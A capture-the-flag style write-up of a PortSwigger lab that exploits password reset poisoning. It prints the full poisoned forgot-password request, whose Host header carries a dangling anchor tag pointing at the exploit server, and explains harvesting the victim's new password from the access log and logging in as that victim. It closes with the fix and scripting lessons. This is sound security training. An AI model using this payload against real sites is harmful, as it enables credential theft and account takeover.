# PortSwigger Lab: Password reset poisoning via dangling markup

- **Lab Name:** Password reset poisoning via dangling markup
- **Topic:** HTTP Host Header Attacks
- **Vulnerability Type:** Password reset poisoning (dangling markup injection)
- **Difficulty:** Practitioner
- **Status:** Solved (banner-verified 27 Nov 2026)
- **Instance:** https://0af70065047a624c801e03e3003c00fb.web-security-academy.net/
- **Exploit server:** https://exploit-0af600d704bf6281803d0257013400ff.exploit-server.net (taken from the lab page's "Go to exploit server" link — never guessed)

## Solution

The reset email is built from the HTTP `Host` header (as in Lab 1), but
here the email is an HTML email and the Host value is injected into it
unescaped. Putting a **dangling `<a href="...` tag** in the Host header
leaves the tag unclosed, so the rest of the email — including the victim's
new password, which appears in the reset link — becomes the `href`
attribute value. When the victim's mail client renders the email, it
requests that "link" from the attacker's server, and the new password
lands in the exploit server's access log.

### Step 1 — Baseline reset for wiener (learn the email format)

First reset my own account (`wiener`) with the poisoned Host, to confirm
the poison works and to see the email format:

```
POST /forgot-password HTTP/1.1
Host: 0af70065047a624c801e03e3003c00fb.web-security-academy.net:'<a href="//exploit-0af600d704bf6281803d0257013400ff.exploit-server.net/?
Content-Type: application/x-www-form-urlencoded

csrf=<token>&username=wiener
```

The exploit server's access log then shows a leak like:

```
GET /?/login'>click here</a> to login with your new password: <wiener-new-password></p> ...
```

**Warning:** this baseline reset *changes wiener's password*. The new
password must be recovered from the exploit server's **email client**
(the reset email lists it; the email client shows the newest email first)
before wiener can be used again. Every further reset generates a fresh
random password, so the value from the email client is only valid until
the next reset.

### Step 2 — Same poisoned reset for carlos

```
POST /forgot-password HTTP/1.1
Host: 0af70065047a624c801e03e3003c00fb.web-security-academy.net:'<a href="//exploit-0af600d704bf6281803d0257013400ff.exploit-server.net/?
Content-Type: application/x-www-form-urlencoded

csrf=<token>&username=carlos
```

Carlos "carelessly clicks" the link in his email, so his reset email is
rendered by the victim bot and the dangling markup fires: within ~2–3
seconds his new password appears in the exploit server's access log.

### Step 3 — Pick carlos's password out of the access log

The log holds several leaked passwords by now (wiener's baseline leak,
carlos's leak, plus values from earlier debug runs). The right one is the
value that satisfies **all three** conditions:

1. its leak timestamp is **after** the carlos reset,
2. it is **not** one of wiener's passwords (collect those from the email
   client first),
3. it is the **newest** such value (the first log match is a stale
   password — wiener's baseline leak — not carlos's).

### Step 4 — Log in as carlos

```
POST /login
csrf=<token>&username=carlos&password=<carlos-new-password-from-the-log>
```

Login succeeds ("logged in as carlos") and the home page shows
**"Congratulations, you solved the lab!"**.

All of this is automated in `~/workspace/scripts/ps-host-header.py`
(`lab7`).

## Practical Explanation

This is a password-reset-poisoning attack with an HTML-injection twist.
The application trusts the `Host` header to build the reset link, and it
also drops that header into an HTML email without escaping it. An
attacker who controls the Host header can therefore inject markup into
the victim's email. A *dangling* `<a href="//attacker/?` tag is the
classic payload: because the tag never closes, everything after it in the
email becomes part of the URL, and the victim's mail client helpfully
fetches it — exfiltrating whatever secret text followed, here the new
password. The lab's victim bot plays the role of the mail client. In the
real world the same bug class (unescaped Host header in an HTML email)
leaks reset tokens, one-time codes or session data to any server the
attacker names. The fix has two parts: build reset links from a
configured domain (never from the request's Host header), and HTML-escape
anything that ends up in an email.

## Lessons Learned

- **The baseline reset changes wiener's password.** Every
  forgot-password request generates a new password, so after the baseline
  run wiener's old password (`peter`) no longer works — recover the new
  one from the exploit server's email client (newest email first) before
  continuing.
- **Take the newest leak, not the first.** The access log keeps every
  leak from every run. The first "new password" match is a stale value
  (wiener's baseline); carlos's password is the newest value after the
  carlos reset that is not one of wiener's.
- **`unquote_plus` silently breaks timestamp matching.** The log lines
  carry timestamps like `2026-11-27 00:29:03 +0000`, and `unquote_plus`
  turns the `+` into a space (`00:29:03  0000`), so a regex looking for
  `\+0000` can never match. Use plain `unquote` on the log.
- **The password capture must not swallow `&lt;`.** The leaked password
  in the log is followed by the HTML entity `&lt;` — a capture class
  containing `&` greedily eats `&lt` into the "password". Keep `&` out of
  the capture class.
- **Match timestamp and password on the same log line.** A lazy `.*?`
  across lines pairs a timestamp with the *next* line's password
  (off-by-one). Confining the match to one line (`[^\n]*?`) keeps the
  pair correct.
- **Log timestamps are UTC.** Compare them with `calendar.timegm`, not
  `time.mktime` (which assumes local time) — otherwise the "leaked after
  the reset" check is off by the timezone offset.
- **The victim leaks fast.** The bot visits within ~2–3 s of the reset,
  so a 5 s poll interval is enough; a 90 s poll that finds nothing means
  the *matching* is broken, not that the leak is slow.
